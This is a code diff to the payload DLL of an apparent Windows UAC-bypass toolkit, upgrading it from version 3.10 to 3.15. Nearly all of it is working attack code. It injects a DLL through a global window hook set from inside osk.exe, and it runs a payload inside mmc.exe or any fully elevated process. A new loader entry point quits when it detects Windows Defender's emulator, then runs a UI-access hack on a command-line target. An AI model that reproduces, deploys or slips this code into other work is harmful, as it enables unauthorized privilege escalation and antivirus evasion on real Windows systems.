@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2014 - 2018
+*  (C) COPYRIGHT AUTHORS, 2014 - 2019
 *
 *  TITLE:       DLLMAIN.C
 *
-*  VERSION:     3.10
+*  VERSION:     3.15
 *
-*  DATE:        18 Nov 2018
+*  DATE:        15 Feb 2019
 *
 *  Proxy dll entry point, Fubuki Kai Ni.
 *
@@ -111,20 +111,21 @@ LRESULT CALLBACK UiAccessMethodHookProc(
 * Purpose:
 *
 * Defines application context and either:
-* - installs windows hook for dll injection
+* - if fInstallHook set - installs windows hook for dll injection
 * - run default payload in target app context
 *
 */
 VOID UiAccessMethodPayload(
-    _In_ HINSTANCE hinstDLL
+    _In_ HINSTANCE hinstDLL,
+    _In_ BOOL fInstallHook,
+    _In_opt_ LPWSTR lpTargetApp
 )
 {
     LPWSTR lpFileName;
     HHOOK hHook;
     HOOKPROC HookProcedure;
+    TOKEN_ELEVATION_TYPE TokenType = TokenElevationTypeDefault;
     WCHAR szModuleName[MAX_PATH + 1];
-
-    OutputDebugString(LoadedMsg);
 
     RtlSecureZeroMemory(szModuleName, sizeof(szModuleName));
     if (GetModuleFileName(NULL, szModuleName, MAX_PATH) == 0)
@@ -133,33 +134,49 @@ VOID UiAccessMethodPayload(
     lpFileName = _filename(szModuleName);
     if (lpFileName == NULL)
         return;
+   
+    if (fInstallHook) {
+
+        //
+        // Check if we are in the required application context
+        // Are we inside osk.exe?
+        //
+        if (_strcmpi(lpFileName, TEXT("osk.exe")) == 0) {
+            HookProcedure = (HOOKPROC)GetProcAddress(hinstDLL, FUBUKI_WND_HOOKPROC); //UiAccessMethodHookProc
+            if (HookProcedure) {
+                hHook = SetWindowsHookEx(WH_CALLWNDPROC, HookProcedure, hinstDLL, 0);
+                if (hHook) {
+                    //
+                    // Timeout to be enough to spawn target app.
+                    //
+                    Sleep(15000);
+                    UnhookWindowsHookEx(hHook);
+                }
+            }
+            ExitProcess(0);
+        }
+    }
 
     //
-    // Check if we are in the required application context
-    // Are we inside osk.exe?
+    // If target application name specified - check are we inside target app?
     //
-    if (_strcmpi(lpFileName, TEXT("osk.exe")) == 0) {
-        HookProcedure = (HOOKPROC)GetProcAddress(hinstDLL, "_FubukiProc2");
-        if (HookProcedure) {
-            hHook = SetWindowsHookEx(WH_CALLWNDPROC, HookProcedure, hinstDLL, 0);
-            if (hHook) {
-                //
-                // Timeout to be enough to spawn target app.
-                //
-                Sleep(15000);
-                UnhookWindowsHookEx(hHook);
+    if (lpTargetApp) {
+        if (_strcmpi(lpFileName, lpTargetApp) == 0) {
+            DefaultPayload();
+        }
+    }
+    else {
+        //
+        // Use any suitable elevated context.
+        //
+        if (ucmGetProcessElevationType(NULL, &TokenType)) {
+            if (TokenType == TokenElevationTypeFull) {
+                DefaultPayload();
             }
         }
-        ExitProcess(0);
-    }
-
-    //
-    // Are we inside target app?
-    //
-    if (_strcmpi(lpFileName, TEXT("mmc.exe")) == 0) {
-        DefaultPayload();
     }
 }
+
 
 /*
 * UiAccessMethodDllMain
@@ -183,7 +200,7 @@ BOOL WINAPI UiAccessMethodDllMain(
     }
 
     if (fdwReason == DLL_PROCESS_ATTACH) {
-        UiAccessMethodPayload(hinstDLL);
+        UiAccessMethodPayload(hinstDLL, TRUE, MMC_EXE);
     }
 
     return TRUE;
@@ -232,4 +249,31 @@ VOID WINAPI EntryPoint(
         ExitProcess('foff');
     }
     DefaultPayload();
+}
+
+
+/*
+* EntryPointUIAccessLoader
+*
+* Purpose:
+*
+* Entry point to be used in exe mode.
+*
+*/
+VOID WINAPI EntryPointUIAccessLoader(
+    VOID)
+{
+    ULONG r;
+    WCHAR szParam[MAX_PATH * 2];
+
+    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED) {
+        ExitProcess('foff');
+    }
+
+    if (GetCommandLineParam(GetCommandLine(), 0, szParam, MAX_PATH, &r)) {
+        if (r > 0) {
+            ucmUIHackExecute(szParam);
+        }
+    }
+    ExitProcess(0);
 }
